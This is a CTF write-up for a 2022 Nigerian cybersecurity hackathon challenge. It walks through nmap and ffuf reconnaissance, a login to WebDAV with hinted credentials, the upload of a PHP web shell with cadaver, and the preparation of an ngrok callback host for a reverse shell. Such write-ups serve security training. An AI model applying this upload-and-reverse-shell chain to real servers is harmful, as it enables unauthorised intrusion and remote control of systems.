---
layout: default
title : n16hth4wk - abcccyberhackathon CTF 2022 Writeup
---

### CTF Overview

As part of the 2021 Cybersecurity Conference, the American Business Council Nigeria (ABC Nigeria) was Organized by NaijaSecForce in partnership with Private Sector partners are hosting a Cybersecurity Hackathon. The objective of the hackathon is to highlight the capacity in the space and show the importance of implementing a cybersecurity framework in Nigeria.

The Hackathon will award innovators for displaying their level of expertise and skills in developing solutions to cyber challenges. A Cyber Award will be allocated in kind and will be distributed among the top three winners. 

Cyber Awards will be awarded to the top three teams. Prices includes Laptops, Cybersecurity Certificates, Bootcamp for winners on Security in IBM Cloud, Cisco Certified CyberOps Associate Certifications for the Team Captains and Merchandise. The Award is sponsored by Cisco, IBM, Comercio and American Business Council.

### pwn challenges writeup by nighthawk

### Linux Method - 1000pts

![1](https://user-images.githubusercontent.com/87468669/194117552-e6e33a3e-ef89-44bd-8c3d-cf939fc8c058.png)

Hmmmm we got an IP and a port, let's us nmap to check and  know what service is running on that port.

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~]
└─$ nmap -sC -sV  185.203.119.220 -p 8003  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 09:54 CDT
Nmap scan report for 185.203.119.220
Host is up (0.20s latency).
PORT     STATE SERVICE VERSION
8003/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.04 seconds
```

noice from our scan we can see that an http apache service is running on that port. let's check it on our browser

![2](https://user-images.githubusercontent.com/87468669/194118284-8c40afac-04bb-4eb0-8c17-4f49048db7b9.png)

sweet… let's check the source page if Muzec have anything for us

![3](https://user-images.githubusercontent.com/87468669/194118623-cf2c96ff-0d32-412a-9735-2ace7305c990.png)

hmmmm… abcctf should help in our journey you say. 🤔

let's burst hidden directory with ffuf

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ ffuf -u "http://185.203.119.220:8003/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.phtml,.bak,.sh -fs 282 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://185.203.119.220:8003/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php .txt .phtml .bak .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 282
________________________________________________

_backup                 [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 202ms]
index.html              [Status: 200, Size: 10772, Words: 3544, Lines: 369, Duration: 166ms]
webdav                  [Status: 401, Size: 464, Words: 42, Lines: 15, Duration: 167ms]
wordpress               [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 163ms]
:: Progress: [28278/28278] :: Job [1/1] :: 95 req/sec :: Duration: [0:02:46] :: Errors: 22 ::
```

nice we got somethings interesting but trust me you'll only want to take a look at the webdav directory.

![4](https://user-images.githubusercontent.com/87468669/194121126-27a27eea-fa0f-4182-a088-adcd2572aaa4.png)

hmmmmmm... We are asked to login 😬. but hope you did not forget what Muzec-san left for us in the default apache web source page "abcctf should help you in your journey...." 😉, so let's try login with username: abcctf and password:abcctf.

![image](https://user-images.githubusercontent.com/87468669/194122426-a83ae6f3-4847-462b-a515-a4194cc97c7b.png)

Boom! we are in and we can see the file nothing.txt... let's check its content

![image](https://user-images.githubusercontent.com/87468669/194123641-6ce5f4a2-ed4d-48b6-b238-c3ec8eb48f98.png)

lol nothing really???? let's scroll down to the bottom of the page

![image](https://user-images.githubusercontent.com/87468669/194123866-9fd5e243-27f0-498c-a974-6cfc1dc925f2.png)

there's a piece of advice to prevent other players from either gaining access with your shell or get hint from it 😉.
Now we know it's running webdav, let's exploit our way and gain reverse shell. in this process we would be using cadaver to upload our shell then get a reverse shell shell. 

```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ cadaver http://185.203.119.220:8003/webdav/
Authentication required for webdav on server `185.203.119.220':
Username: abcctf
Password: 
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 348 bytes succeeded.
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        nothing.txt                          374  Oct  2 22:37
        shell.php                            348  Oct  5 12:42
dav:/webdav/> 

```

![image](https://user-images.githubusercontent.com/87468669/194126637-3fd3164f-2b79-4724-9a26-c1839c539120.png)


![image](https://user-images.githubusercontent.com/87468669/194126743-bb62ec9f-8cff-43c3-a430-d396f391a395.png)


![image](https://user-images.githubusercontent.com/87468669/194126878-06588b8b-f61b-4b65-8f38-3e4a0aa10846.png)

now let's ping our ngrok.io to get an ip address
```
┌──(n16hth4wk㉿n16hthawk-sec)-[~/abcctf/method]
└─$ ping -c 2 2.tcp.eu.ngrok.io
PING 2.tcp.eu.ngrok.io (3.126.37.18) 56(84) bytes of data.
64 bytes from 3.126.37.18 (3.126.37.18): icmp_seq=1 ttl=234 time=160 ms
64 bytes from 3.126.37.18 (3.126.37.18): icmp_seq=2 ttl=234 time=146 ms

--- 2.tcp.eu.ngrok.io ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 145.905/152.805/159.706/6.900 ms

```

![image](https://user-images.githubusercontent.com/87468669/194127758-cb433e30-7425-45a6-8d5d-f8cac0fd0ca2.png)

![image](https://user-images.githubusercontent.com/87468669/194127891-58614c0b-9f2b-4c9c-883a-99f5e08fa298.png)

![image](https://user-images.githubusercontent.com/87468669/194128264-0d992453-8661-4122-8e9c-810eaa49994f.png)





